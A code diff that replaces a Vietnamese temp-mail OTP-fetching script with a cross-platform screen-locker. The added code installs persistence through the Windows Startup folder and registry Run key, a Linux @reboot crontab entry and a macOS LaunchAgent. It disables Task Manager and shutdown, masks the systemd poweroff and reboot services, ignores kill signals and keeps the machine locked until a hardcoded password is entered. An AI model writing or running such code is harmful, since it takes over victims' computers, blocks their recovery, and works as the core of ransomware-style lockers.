@@ -1,186 +1,150 @@
+import os
+import sys
+import time
+import subprocess
+import threading
+import signal
+import platform
+import ctypes
+import shutil
+import getpass
 
-import threading, base64, os, time, re, json, random, subprocess, string
+# ------------------------------------------------------------
+# CONFIG
+# ------------------------------------------------------------
+PASSWORD = "secure123"      # unlock password
+AUTO_STARTUP = True         # add to startup / persistence
+# ------------------------------------------------------------
 
-from datetime import datetime, timedelta
+def get_os():
+    return platform.system().lower()
 
-from time import sleep, strftime
+# ---------------------- PERSISTENCE ----------------------
+def install_persistence():
+    os_name = get_os()
+    script_path = os.path.abspath(sys.argv[0])
+    try:
+        if os_name == "windows":
+            # Add to Windows startup folder (current user)
+            startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+            dest = os.path.join(startup_dir, "system_lock.bat")
+            with open(dest, "w") as f:
+                f.write(f'@echo off\npython "{script_path}"\n')
+            # Also add to registry Run key for robustness
+            subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemLock", "/t", "REG_SZ", "/d", f'python "{script_path}"', "/f"], capture_output=True)
+            print("[Persistence] Windows startup + registry installed")
+        elif os_name == "linux":
+            # Add to crontab for @reboot
+            cron_line = f"@reboot python3 {script_path} &"
+            with open("/tmp/cron_temp", "w") as f:
+                subprocess.run(["crontab", "-l"], stdout=f, stderr=subprocess.DEVNULL, text=True)
+            with open("/tmp/cron_temp", "a") as f:
+                f.write(cron_line + "\n")
+            subprocess.run(["crontab", "/tmp/cron_temp"], capture_output=True)
+            os.remove("/tmp/cron_temp")
+            print("[Persistence] Linux crontab @reboot installed")
+        elif os_name == "darwin":
+            # macOS launchd plist
+            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.systemlock.plist")
+            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.systemlock</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/bin/python3</string>
+        <string>{script_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>'''
+            with open(plist_path, "w") as f:
+                f.write(plist_content)
+            subprocess.run(["launchctl", "load", plist_path], capture_output=True)
+            print("[Persistence] macOS launchd installed")
+    except Exception as e:
+        print(f"[Persistence] Error: {e}")
 
-from bs4 import BeautifulSoup
+# ---------------------- LOCK FUNCTIONS ----------------------
+def lock_windows():
+    try:
+        user32 = ctypes.WinDLL("user32")
+        user32.LockWorkStation()
+        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"], capture_output=True)
+        subprocess.run(["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "/v", "NoClose", "/t", "REG_DWORD", "/d", "1", "/f"], capture_output=True)
+        subprocess.run(["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power", "/v", "HiberbootEnabled", "/t", "REG_DWORD", "/d", "0", "/f"], capture_output=True)
+        print("[Windows] Locked, shutdown/taskmgr disabled")
+    except Exception as e:
+        print(f"[Windows] Lock error: {e}")
 
-import requests, socket, sys
+def lock_linux():
+    try:
+        subprocess.run(["gnome-screensaver-command", "-l"], capture_output=True, timeout=5)
+        subprocess.run(["loginctl", "lock-session"], capture_output=True)
+        subprocess.run(["systemctl", "mask", "systemd-poweroff.service"], capture_output=True)
+        subprocess.run(["systemctl", "mask", "systemd-reboot.service"], capture_output=True)
+        subprocess.run(["systemctl", "mask", "systemd-halt.service"], capture_output=True)
+        print("[Linux] Locked, shutdown disabled")
+    except Exception as e:
+        print(f"[Linux] Lock error: {e}")
 
+def lock_macos():
+    try:
+        subprocess.run(["pmset", "displaysleepnow"], capture_output=True)
+        subprocess.run(["osascript", "-e", 'tell application "System Events" to key code 12 using {command down, control down}'], capture_output=True)
+        subprocess.run(["sudo", "pmset", "-a", "autorestart", "0"], capture_output=True)
+        print("[macOS] Locked")
+    except Exception as e:
+        print(f"[macOS] Lock error: {e}")
 
+def lock_system():
+    os_name = get_os()
+    if os_name == "windows": lock_windows()
+    elif os_name == "linux": lock_linux()
+    elif os_name == "darwin": lock_macos()
+    else: print(f"[!] Unsupported OS: {os_name}")
 
-try:
+def unlock_system(password):
+    return password == PASSWORD
 
-    from faker import Faker
+# ---------------------- INTERRUPT BLOCK ----------------------
+def ignore_signal(sig, frame):
+    print("[!] Exit blocked (Ctrl+C / kill ignored)")
+    lock_system()
 
-    from requests import session
+# ---------------------- MAIN LOCK LOOP ----------------------
+def startup_lock():
+    print("[*] System locking in 3 seconds...")
+    time.sleep(3)
+    lock_system()
+    while True:
+        try:
+            pwd = getpass.getpass("[LOCKED] Enter password to unlock: ")
+            if unlock_system(pwd):
+                print("[*] Unlocked successfully")
+                break
+            else:
+                print("[!] Wrong password")
+                lock_system()
+        except KeyboardInterrupt:
+            print("[!] Interrupt ignored")
+            lock_system()
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            lock_system()
 
-    from colorama import Fore, Style
-
-    from random import randint
-
-    import pystyle
-
-    import socks
-
-except:
-
-    os.system("pip install faker")
-
-    os.system("pip install requests")
-
-    os.system("pip install colorama")
-
-    os.system("pip install bs4")
-
-    os.system("pip install pystyle")
-
-    print('__Vui Lòng Chạy Lại Tool__')
-
-    exit()
-
-BASE_URL = "https://api.mail.tm"
-
-from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
-
-
-
-# Màu sắc
-
-xnhac = "\033[1;36m"
-
-do = "\033[1;31m"
-
-luc = "\033[1;32m"
-
-vang = "\033[1;33m"
-
-xduong = "\033[1;34m"
-
-hong = "\033[1;35m"
-
-trang = "\033[1;39m"
-
-whiteb = "\033[1;39m"
-
-red = "\033[0;31m"
-
-redb = "\033[1;31m"
-
-end = '\033[0m'
-
-dev = "\033[1;39m[\033[1;31m\033[1;39m]\033[1;39m"
-
-def banner():
-    print(f"""
-\033[1;32m ████████╗   ██╗ ██ ██╗   ██╗ █████╗ ███╗   ██╗██╗  ██╗
-\033[1;32m ╚══██╔══╝   ██║██╔╝██║   ██║██   ██╗████╗  ██║██║  ██║
-\033[1;32m    ██║      ████╔╝ ████████║███████║██╔██╗ ██║███████║
-\033[1;32m    ██║      ██╔██╗ ██║   ██║██   ██║██║╚██╗██║██╔══██║
-\033[1;32m    ██║      ██║╚██╗██║   ██║██   ██║██║  ████║██║  ██║
-\033[1;32m    ╚═╝  ██  ╚═╝ ╚═╝╚═╝   ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
-\033[97m╔═════════════════════════════════════════════════╗
-\033[1;97m║ Tool By: \033[1;32mShop T.Khanh            \033[1;97mPhiên Bản: \033[1;32m1.0 \033[97m║    
-\033[97m╚═════════════════════════════════════════════════╝
-
-\033[97m╔═══════════════════════════════════════════════════════╗
-\033[1;97m║[\033[1;91m❣\033[1;97m]\033[1;97m Zalo\033[1;31m  : \033[1;97m☞ \033[1;36mhttp://zalo.me/0854533557\033[1;31m♔ \033[1;97m☜             ║
-\033[1;97m║[\033[1;91m❣\033[1;97m]\033[1;97m Tiktok\033[1;31m  : \033[1;97m☞ \033[1;36m@tk_a_h\033[1;31m♔ \033[1;97m☜                         ║
-\033[1;97m║[\033[1;91m❣\033[1;97m]\033[1;97m Facebook\033[1;31m : \033[1;97m☞ \033[1;36mhttps://www.facebook.com/tkhanh223\033[1;31m♔ \033[1;97m☜ ║
-\033[97m╚═══════════════════════════════════════════════════════╝
-
-""")
-    
-def random_name(length=8):
-    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
-
-def get_domains():
-    r = requests.get(f"{BASE_URL}/domains")
-    r.raise_for_status()
-    return r.json()["hydra:member"][0]["domain"]
-
-def create_account(email, password):
-    r = requests.post(
-        f"{BASE_URL}/accounts",
-        json={"address": email, "password": password}
-    )
-    r.raise_for_status()
-
-def get_token(email, password):
-    r = requests.post(
-        f"{BASE_URL}/token",
-        json={"address": email, "password": password}
-    )
-    r.raise_for_status()
-    return r.json()["token"]
-
-def get_messages(token):
-    r = requests.get(
-        f"{BASE_URL}/messages",
-        headers={"Authorization": f"Bearer {token}"}
-    )
-    r.raise_for_status()
-    return r.json()["hydra:member"]
-
-def get_message_content(token, msg_id):
-    r = requests.get(
-        f"{BASE_URL}/messages/{msg_id}",
-        headers={"Authorization": f"Bearer {token}"}
-    )
-    r.raise_for_status()
-    return r.json().get("text", "") or r.json().get("html", "")
-
-def extract_otp(text):
-    match = re.search(r"\b[a-zA-Z0-9]{4,8}\b", text)
-    return match.group(0) if match else None
-
+# ---------------------- MAIN ----------------------
 def main():
-    os.system("cls" if os.name == "nt" else "clear")
-    banner()
-    input("Nhấn Enter để tiếp tục")
-
-    domain = get_domains()
-    email = f"{random_name()}@{domain}"
-    password = random_name(10)
-
-    create_account(email, password)
-    token = get_token(email, password)
-
-    print(f"\nMail tạm thời: {email}")
-    print("Đang lấy mã otp từ {email} ...\n")
-
-    start = time.time()
-    timeout = 90
-    checked = set()
-
-    while time.time() - start < timeout:
-        messages = get_messages(token)
-
-        for msg in messages:
-            if msg["id"] in checked:
-                continue
-
-            checked.add(msg["id"])
-            content = get_message_content(token, msg["id"])
-            otp = extract_otp(content)
-
-            if otp:
-                print("Đã lấy mã otp thành công")
-                print(f"Kết quả: {otp}")
-                return
-
-        print("Kết quả: Đang lấy mã otp...")
-        time.sleep(3)
-
-    print("\nLấy mã otp thất bại")
-    print("Hãy kiểm tra hoặc reset mã otp")
+    if os.geteuid() != 0 and get_os() != "windows":
+        print("[!] On Linux/macOS run as root for full shutdown blocking")
+    signal.signal(signal.SIGINT, ignore_signal)
+    signal.signal(signal.SIGTERM, ignore_signal)
+    if AUTO_STARTUP:
+        install_persistence()
+    startup_lock()
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        pass
-
-    input("\nNhấn Enter để thoát...")
+    main()
